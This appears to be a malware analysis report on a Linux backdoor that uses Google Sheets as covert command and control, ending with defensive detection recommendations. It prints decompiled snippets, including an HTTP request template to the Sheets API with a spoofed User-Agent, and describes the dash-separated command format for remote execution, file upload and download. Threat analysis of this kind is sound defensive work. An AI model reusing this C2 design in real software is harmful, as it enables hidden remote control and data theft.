1. Executive Summary

The analyzed binary is a 64-bit Linux ELF backdoor that utilizes Google Sheets as a Command and Control (C2) infrastructure to evade network detection. Upon execution, the malware decrypts a configuration file located alongside the binary (derived from /proc/self/exe) using AES-CBC encryption. It performs system reconnaissance, gathering hostname, IP addresses, and user details, and authenticates with Google APIs using a signed JWT (JSON Web Token). The malware enters a persistent polling loop, reading commands from a specific Google Spreadsheet. It supports remote command execution (via popen), file upload, and file download. The use of legitimate Google APIs for C2 traffic makes network detection challenging, blending in with standard application traffic.

4. Technical Analysis

In-depth technical examination of the malware code structure, algorithms, and implementation details.
Configuration Decryption

The malware locates its own path via /proc/self/exe, appends .cfg, and reads this file. It then decrypts the contents using AES-CBC. This suggests the binary requires a side-car configuration file (likely containing keys, spreadsheet IDs, or OAuth credentials) encrypted with a hard-coded or derived key.

Code Evidence (fcn.00408190 @ 0x00408190): 
rax = readlink ("/proc/self/exe", rsp, 0x1000);
// ... manipulation to change extension ...
AES_cbc_encrypt ();
Google Sheets C2 Protocol

The malware uses the Google Sheets API v4. It authenticates via OAuth2 using a JWT signed with RS256 ({"alg":"RS256"...). It sends requests to sheets.googleapis.com to read values (C2 commands) and update/clear values (C2 responses/data). It uses batchUpdate and batchClear endpoints.

Code Evidence (fcn.00409110 @ 0x00409110): 
snprintf (rdi, 0x800, "GET /v4/spreadsheets/%s/values/%s?valueRenderOption=FORMULA HTTP/1.1\r\nHost: sheets.googleapis.com\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Bearer %s\r\nUser-Agent: Directory API Google-API-Java-Client/2.0.0 Google-HTTP-Java-Client/1.42.3 (gzip)\r\nContent-Type: application/json; charset=UTF-8\r\nContent-Encoding: gzip\r\n\r\n", *(0x00763d10));
Command Parsing & Execution

The main loop parses commands received from the spreadsheet. It uses strchr to split strings by dashes (-). Identified commands include C-C (Command/Execute), C-D (Download), and C-U (Upload).

7. Operational Flow

  1. Initialization: The binary locates its path, reads a corresponding .cfg file, and decrypts it using AES_cbc_encrypt — Evidence: fcn.00408190 @ 0x00408190.
  2. Authentication: The malware generates a JWT and requests an OAuth2 access token from Google — Evidence: fcn.00408960 @ 0x00408960.
  3. Reconnaissance: System details (hostname, IPs, user) are collected — Evidence: fcn.00408b20 @ 0x00408b20.
  4. C2 Registration: The malware likely sends the initial recon data to the Google Sheet (implied by logic in main calling send/receive functions).
  5. Command Loop:
    • Polling: The malware sleeps (with jitter) then reads specific cells in the Google Sheet — Evidence: main @ 0x004095c0 calling fcn_00409300.
    • Parsing: It parses the cell content looking for commands separated by dashes (e.g., C-C-<cmd>) — Evidence: main @ 0x004095c0 using strchr(rbx, 0x2d).
    • Execution:
    • If command is C-C (Execute): It runs the command via popen — Evidence: fcn.00407310.
    • If command is C-D (Download): It writes data to a file — Evidence: main @ 0x004095c0 (fopen write mode).
    • If command is C-U (Upload): It reads a file and prepares to send data — Evidence: main @ 0x004095c0 (fopen read mode).
  6. Cleanup: After execution, the malware clears the command from the sheet (batchClear) — Evidence: fcn.004094b0 @ 0x004094b0.

8. C2 & Networking

  • C2 Servers: oauth2.googleapis.com, sheets.googleapis.com, www.googleapis.com.
  • Protocols: HTTPS (implied by Google API usage), HTTP/1.1.
  • Communication Pattern: The malware acts as a client interacting with Google Sheets API v4. It authenticates via OAuth2 Bearer tokens. It polls the spreadsheet for new commands and updates cells with output.
  • Command Format: Dash-separated strings (e.g., Type-Action-Arguments).
  • Examples inferred from code: C-C-<cmd> (Execute Command), C-U-<file> (Upload), C-D-<file> (Download).
  • Authentication: OAuth2 using JWT Bearer grant (urn:ietf:params:oauth:grant-type:jwt-bearer).
  • Data Format: JSON for API payloads ({"ranges":["a1:z1000"]}).

9. Recommendations

1
Network Detection: Monitor egress traffic to sheets.googleapis.com and oauth2.googleapis.com for unusual patterns (e.g., high-frequency polling from non-user-interactive processes).
2
Endpoint Detection: Scan for processes reading /proc/self/exe to locate configuration files (likely ending in .cfg) in the same directory.
3
Identity Protection: Audit Google Workspace logs for OAuth2 token creation using "Service Account" or specific client identifiers associated with the JWT signatures found in the binary.
4
Behavioral Blocking: Block execution of unsigned binaries that attempt to utilize both popen (shell execution) and network sockets to cloud storage APIs.
